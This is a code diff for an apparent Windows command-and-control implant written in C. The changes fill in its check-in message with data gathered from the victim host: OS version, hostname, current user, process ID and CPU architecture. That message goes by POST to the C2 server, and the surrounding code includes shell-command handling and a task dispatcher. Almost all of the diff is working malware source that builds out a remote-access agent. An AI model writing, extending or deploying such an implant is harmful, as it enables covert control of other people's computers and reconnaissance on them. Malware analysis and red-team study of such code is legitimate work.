@@ -5,7 +5,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-
+#include <assert.h>
 // windows.h and friends
 #include <windows.h>
 #include <tlhelp32.h>
@@ -16,6 +16,8 @@
 #include "base64.h"
 
 typedef cJSON* task_t;
+typedef NTSTATUS (*RtlGetVersion_Ptr)(OSVERSIONINFOW*);
+
 
 //QUEUE START
 #define MAX_SIZE 100
@@ -81,7 +83,7 @@ return q->items[q->front];
 }
 //QUEUE END
 
-
+char* handle_whoami_cmd();
 char* handle_shell_cmd(cJSON *task);
 void dispatcher(cJSON *task);
 bool sleep_with_jitter(int interval, int jitter);
@@ -185,6 +187,7 @@ char* send_c2_post_request(char* json_data) {
             InternetCloseHandle(hRequest);
             InternetCloseHandle(hConnect);
             InternetCloseHandle(hInternet);
+            free(to_be_send);
             return response;
             
         }
@@ -192,15 +195,68 @@ char* send_c2_post_request(char* json_data) {
     free(to_be_send);
 return NULL;
 }
+char* GetOsInfo(){
+    static char out[32] = {0};
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    FARPROC Os_Info_ptr = GetProcAddress(ntdll,"RtlGetVersion");
+    RtlGetVersion_Ptr Function = (RtlGetVersion_Ptr)Os_Info_ptr;
+    if(Function == NULL){
+        printf("ntdll getting failed\n");
+        return "FAILED TO GET OS INFO";
+    }
+    OSVERSIONINFOW structure;
+    structure.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
+    Function(&structure);
+    int Major = (int)structure.dwMajorVersion;
+    int Minor = (int)structure.dwMinorVersion;
+    unsigned long build = structure.dwBuildNumber;
+    snprintf(out,sizeof(out),"M(%d) m(%d) B(%lu)",Major,Minor,build);
+    return out;
+}
+
+char* get_hostname(){
+    static char output[MAX_COMPUTERNAME_LENGTH+1] = {0};
+    DWORD size = MAX_COMPUTERNAME_LENGTH+1; 
+    if(!GetComputerNameA(output,&size)){
+        printf("failed to get hostname\n");
+        return "ERROR :(";
+    }
+return output;
+}
+char* get_sysinfo(){
+    SYSTEM_INFO structure;
+    GetNativeSystemInfo(&structure);
+    switch(structure.wProcessorArchitecture){
+    case PROCESSOR_ARCHITECTURE_AMD64:
+        return "x64";
+    case PROCESSOR_ARCHITECTURE_ARM:
+        return "arm32";
+    case PROCESSOR_ARCHITECTURE_ARM64:
+        return "arm64";
+    case PROCESSOR_ARCHITECTURE_IA64:
+        return "IA64";
+    case PROCESSOR_ARCHITECTURE_INTEL:
+        return "x86";
+    default:
+        return "UNDEF";
+}
+}
+
 void checkin(){
         char json_checkin_buff[190];
-    snprintf(json_checkin_buff,sizeof(json_checkin_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"NOT IMPLEMENTED\", \"user\": \"NOT IMPLEMENTED\", \"host\": \"NOT IMPLEMENTED\", \"pid\": 0, \"architecture\": \"x64\"}",config.uuid);
+    snprintf(json_checkin_buff,sizeof(json_checkin_buff),"{\"action\": \"checkin\", \"uuid\": \"%s\", \"os\": \"%s\", \"user\": \"%s\", \"host\": \"%s\", \"pid\": %lu, \"architecture\": \"%s\"}",config.uuid,GetOsInfo(),handle_whoami_cmd(),get_hostname(),GetCurrentProcessId(),get_sysinfo());
     char* resp = send_c2_post_request(json_checkin_buff); //checkin do serwera
+    if(resp == NULL){
+        printf("received no answer from C2 server when checkin, behavior not implemented\n");
+        free(resp);
+        return;
+    }
     cJSON *root = cJSON_Parse(resp);
     if (root !=NULL){
         cJSON *status = cJSON_GetObjectItemCaseSensitive(root, "status");
         cJSON *id = cJSON_GetObjectItemCaseSensitive(root, "id");
         cJSON *action = cJSON_GetObjectItemCaseSensitive(root, "action");
+        assert(status != NULL && id != NULL && action != NULL); // only for dev version, later just change it to if
         if(strcmp(status->valuestring,"success") == 0 && cJSON_IsString(id) && !strcmp(action->valuestring,"checkin")){
             strncpy(config.uuid,id->valuestring,sizeof(config.uuid) - 1);
         }
@@ -427,6 +483,7 @@ cJSON_AddStringToObject(user_input_p,"user_output",buff);
             buff[0] = '\0';
 
 }
+cJSON_DetachItemFromArray(arr, cJSON_GetArraySize(arr) - 1);
 cJSON_Delete(user_input_p);
 cJSON *statusik = cJSON_GetObjectItemCaseSensitive(obj,"status");
 cJSON_SetValuestring(statusik,"success");
